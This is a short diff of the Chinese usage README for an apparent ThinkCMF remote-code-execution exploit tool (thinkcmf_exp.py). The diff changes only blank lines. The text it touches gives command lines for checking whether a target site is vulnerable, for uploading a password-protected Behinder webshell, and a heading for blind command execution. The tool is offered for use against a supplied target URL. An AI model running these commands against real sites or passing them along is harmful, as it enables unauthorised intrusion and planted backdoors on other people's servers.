@@ -18,15 +18,13 @@ ThinkCMF源码下载地址https://gitee.com/thinkcmf/ThinkCMFX/releases
 # 使用说明:
 
 ### 显示帮助
-
 python thinkcmf_exp.py -h 
 
 ### 检测漏洞是否存在
-
 python thinkcmf_exp.py -u http://yourURL/
 ![image](https://github.com/bo1349/Thinkcmf_RCE/blob/master/%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E.png)
-### 上传冰蝎马
 
+### 上传冰蝎马
 python thinkcmf_exp.py -u http://yourURL/ -p yourPassword
 
 ### 无回显命令执行
